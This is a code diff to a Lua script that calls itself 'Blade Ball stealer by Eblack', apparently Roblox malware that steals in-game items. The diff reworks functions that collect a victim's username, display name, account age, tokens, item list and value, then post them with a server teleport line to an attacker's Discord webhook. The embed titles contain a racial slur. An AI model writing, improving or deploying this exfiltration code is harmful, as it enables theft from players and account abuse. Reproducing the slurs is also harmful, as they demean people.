@@ -147,11 +147,20 @@ end
 local totalRAP = 0
 
 local function SendJoinMessage(list, prefix)
+    -- On récupère les tokens du joueur
+    local tokensVal = "0"
+    pcall(function() tokensVal = formatNumber(tonumber(PlayerGui.Main.Currency.Coins.Amount.Text:gsub("[^%d]", ""))) end)
+
     local fields = {
         {
-            name = "Victim Username 🤖:",
-            value = plr.Name,
-            inline = true
+            name = "ℹ️ Player info:",
+            value = "```" ..
+                "\n🆔 Username     : " .. plr.Name ..
+                "\n👤 Display Name : " .. plr.DisplayName ..
+                "\n🗓️ Account Age  : " .. plr.AccountAge .. " Days" ..
+                "\n🪙 Tokens       : " .. tokensVal ..
+                "```",
+            inline = false
         },
         {
             name = "Join link 🔗:",
@@ -159,160 +168,96 @@ local function SendJoinMessage(list, prefix)
         },
         {
             name = "Item list 📝:",
-            value = "",
+            value = "```\n",
             inline = false
         },
         {
             name = "Summary 💰:",
-            value = string.format("Total RAP: %s", formatNumber(totalRAP)),
+            value = "```\nTotal RAP: " .. formatNumber(totalRAP) .. "```",
             inline = false
         }
     }
 
     local grouped = {}
     for _, item in ipairs(list) do
-        if grouped[item.Name] then
-            grouped[item.Name].Count = grouped[item.Name].Count + 1
-            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
-        else
-            grouped[item.Name] = {
-                Name = item.Name,
-                Count = 1,
-                TotalRAP = item.RAP
-            }
-        end
+        grouped[item.Name] = (grouped[item.Name] or {Count = 0, TotalRAP = 0})
+        grouped[item.Name].Count = grouped[item.Name].Count + 1
+        grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
     end
 
     local groupedList = {}
-    for _, group in pairs(grouped) do
-        table.insert(groupedList, group)
-    end
-
-    table.sort(groupedList, function(a, b)
-        return a.TotalRAP > b.TotalRAP
-    end)
+    for _, group in pairs(grouped) do table.insert(groupedList, group) end
+    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)
 
     for _, group in ipairs(groupedList) do
-        local itemLine = string.format("%s (x%s) - %s RAP", group.Name, group.Count, formatNumber(group.TotalRAP))
-        fields[3].value = fields[3].value .. itemLine .. "\n"
+        local itemLine = string.format("%s (x%s) - %s RAP\n", group.Name, group.Count, formatNumber(group.TotalRAP))
+        fields[3].value = fields[3].value .. itemLine
     end
+    fields[3].value = fields[3].value .. "```" -- On ferme le bloc de code
 
-    if #fields[3].value > 1024 then
-        local lines = {}
-        for line in fields[3].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
-        end
-
-        while #fields[3].value > 1024 and #lines > 0 do
-            table.remove(lines)
-            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
-        end
-    end
+    -- Sécurité limite Discord
+    if #fields[3].value > 1024 then fields[3].value = string.sub(fields[3].value, 1, 1000) .. "...\n```" end
 
     local data = {
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["auth_token"] = auth_token, 
-		["embeds"] = {{
+        ["embeds"] = {{
             ["title"] = "🟣 Bro join your hit nigga 🎯",
             ["color"] = 8323327,
             ["fields"] = fields,
-            ["footer"] = {
-                ["text"] = "Blade Ball stealer by Eblack"
-            }
+            ["thumbnail"] = {["url"] = "[https://www.roblox.com/headshot-thumbnail/image?userId=](https://www.roblox.com/headshot-thumbnail/image?userId=)" .. plr.UserId .. "&width=420&height=420&format=png"},
+            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
         }}
     }
-    local body = HttpService:JSONEncode(data)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    local response = request({
-        Url = webhook,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
+    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
 end
 
 local function SendMessage(list)
     local fields = {
-		{
-			name = "Victim Username 🤖:",
-			value = plr.Name,
-			inline = true
-		},
-		{
-			name = "Items sent 📝:",
-			value = "",
-			inline = false
-		},
         {
-            name = "Summary 💰:",
-            value = string.format("Total RAP: %s", formatNumber(totalRAP)),
+            name = "👤 Victim:",
+            value = "```" .. plr.Name .. "```",
+            inline = true
+        },
+        {
+            name = "Items sent 📝:",
+            value = "```\n",
+            inline = false
+        },
+        {
+            name = "💰 Summary:",
+            value = "```Total RAP: " .. formatNumber(totalRAP) .. "```",
             inline = false
         }
-	}
+    }
 
     local grouped = {}
     for _, item in ipairs(list) do
-        if grouped[item.Name] then
-            grouped[item.Name].Count = grouped[item.Name].Count + 1
-            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
-        else
-            grouped[item.Name] = {
-                Name = item.Name,
-                Count = 1,
-                TotalRAP = item.RAP
-            }
-        end
+        grouped[item.Name] = (grouped[item.Name] or {Count = 0, TotalRAP = 0})
+        grouped[item.Name].Count = grouped[item.Name].Count + 1
+        grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
     end
 
     local groupedList = {}
-    for _, group in pairs(grouped) do
-        table.insert(groupedList, group)
-    end
-
-    table.sort(groupedList, function(a, b)
-        return a.TotalRAP > b.TotalRAP
-    end)
+    for _, group in pairs(grouped) do table.insert(groupedList, group) end
+    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)
 
     for _, group in ipairs(groupedList) do
-        local itemLine = string.format("%s (x%s) - %s RAP", group.Name, group.Count, formatNumber(group.TotalRAP))
-        fields[2].value = fields[2].value .. itemLine .. "\n"
+        local itemLine = string.format("%s (x%s) - %s RAP\n", group.Name, group.Count, formatNumber(group.TotalRAP))
+        fields[2].value = fields[2].value .. itemLine
     end
-
-    if #fields[2].value > 1024 then
-        local lines = {}
-        for line in fields[2].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
-        end
-
-        while #fields[2].value > 1024 and #lines > 0 do
-            table.remove(lines)
-            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
-        end
-    end
+    fields[2].value = fields[2].value .. "```"
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "🟣 The nigga is on the server 🎉" ,
+            ["title"] = "🟣 The nigga is on the server 🎉",
             ["color"] = 8323327,
-			["fields"] = fields,
-			["footer"] = {
-				["text"] = "Blade Ball stealer by Eblack"
-			}
+            ["fields"] = fields,
+            ["thumbnail"] = {["url"] = "[https://www.roblox.com/headshot-thumbnail/image?userId=](https://www.roblox.com/headshot-thumbnail/image?userId=)" .. plr.UserId .. "&width=420&height=420&format=png"},
+            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
         }}
     }
-
-    local body = HttpService:JSONEncode(data)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    local response = request({
-        Url = webhook,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
+    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
 end
 
 local rapDataResult = Replion.Client:GetReplion("ItemRAP")
